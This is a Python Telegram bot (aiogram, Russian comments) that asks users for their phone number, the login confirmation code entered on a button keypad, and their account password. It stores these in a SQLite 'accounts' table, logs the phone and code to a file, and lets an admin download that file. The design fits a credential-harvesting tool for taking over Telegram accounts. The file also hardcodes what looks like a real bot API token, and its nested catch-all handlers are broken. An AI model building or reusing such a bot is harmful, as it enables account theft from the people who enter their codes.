import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import sqlite3
import os

API_TOKEN = '6760012279:AAGfY1w2LR7TuY1r_mbMXIyLlscrai2oT28'  # Твой API токен

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Инициализация бота и диспетчера
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# ID администратора
ADMIN_ID = 954053674  # Укажи свой ID администратора

# Файл для логов
LOG_FILE = 'logs.txt'

# Создаем/открываем файл для логов
def log_action(action):
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(action + '\n')

# Функция для проверки, является ли пользователь администратором
def is_admin(user_id):
    return user_id == ADMIN_ID

# База данных
conn = sqlite3.connect('accounts.db')
cursor = conn.cursor()

# Создаем таблицы если они не существуют
cursor.execute('''CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT,
    password TEXT,
    status TEXT DEFAULT 'active'
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS apps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    name TEXT
)''')
conn.commit()

# Главная команда /start
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    add_account_btn = KeyboardButton("➕ Добавить аккаунт")
    manage_apps_btn = KeyboardButton("⚙ Управление приложениями")
    
    # Кнопка для скачивания логов только для администратора
    if is_admin(message.from_user.id):
        download_logs_btn = KeyboardButton("📄 Скачать логи")
        markup.add(download_logs_btn)
    
    markup.add(add_account_btn, manage_apps_btn)
    
    await message.answer("Добро пожаловать! Выберите действие:", reply_markup=markup)

# Обработка добавления аккаунта
@dp.message_handler(lambda message: message.text == "➕ Добавить аккаунт")
async def add_account(message: types.Message):
    await message.answer("Введите номер телефона:")
    
    @dp.message_handler()
    async def get_phone_number(message: types.Message):
        phone = message.text
        cursor.execute("INSERT INTO accounts (phone) VALUES (?)", (phone,))
        conn.commit()
        
        # Логируем добавление аккаунта
        log_action(f"{message.from_user.username}: Добавил аккаунт: {phone}")
        
        await message.answer("Введите код подтверждения (будет отображаться клавиатура):")
        
        # Отображаем цифровую клавиатуру 3х3
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        buttons = [KeyboardButton(str(i)) for i in range(1, 10)]
        markup.add(*buttons)
        await message.answer("Введите код с помощью кнопок ниже:", reply_markup=markup)

        # Ожидаем код подтверждения
        @dp.message_handler()
        async def enter_code(message: types.Message):
            code = message.text
            
            # Логируем ввод кода
            log_action(f"{message.from_user.username}: Ввёл код: {code}")
            
            await message.answer(f"Аккаунт добавлен: {phone}")
            
            # Проверяем необходимость ввода пароля
            await message.answer("Если требуется пароль, введите его:")
            
            @dp.message_handler()
            async def enter_password(message: types.Message):
                password = message.text
                cursor.execute("UPDATE accounts SET password = ? WHERE phone = ?", (password, phone))
                conn.commit()
                
                # Логируем ввод пароля
                log_action(f"{message.from_user.username}: Ввёл пароль")
                
                await message.answer(f"Пароль добавлен для аккаунта: {phone}")

# Обработка управления аккаунтами
@dp.message_handler(lambda message: message.text == "⚙ Управление аккаунтами")
async def manage_accounts(message: types.Message):
    cursor.execute("SELECT phone FROM accounts")
    accounts = cursor.fetchall()
    if accounts:
        accounts_list = "\n".join([f"Аккаунт: {account[0]}" for account in accounts])
        await message.answer(f"Ваши аккаунты:\n{accounts_list}")
    else:
        await message.answer("У вас еще нет добавленных аккаунтов.")

# Добавление приложения
@dp.message_handler(lambda message: message.text == "⚙ Управление приложениями")
async def manage_apps(message: types.Message):
    await message.answer("Введите ссылку на приложение:")
    
    @dp.message_handler()
    async def add_app_link(message: types.Message):
        app_url = message.text
        cursor.execute("INSERT INTO apps (url) VALUES (?)", (app_url,))
        conn.commit()
        
        # Логируем добавление ссылки
        log_action(f"{message.from_user.username}: Добавил ссылку: {app_url}")
        
        await message.answer(f"Приложение добавлено: {app_url}")

# Скачать логи (доступно только администратору)
@dp.message_handler(lambda message: message.text == "📄 Скачать логи")
async def send_logs(message: types.Message):
    if is_admin(message.from_user.id):
        with open(LOG_FILE, 'rb') as log_file:
            await bot.send_document(message.chat.id, log_file)
    else:
        await message.answer("У вас нет доступа к этой команде.")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
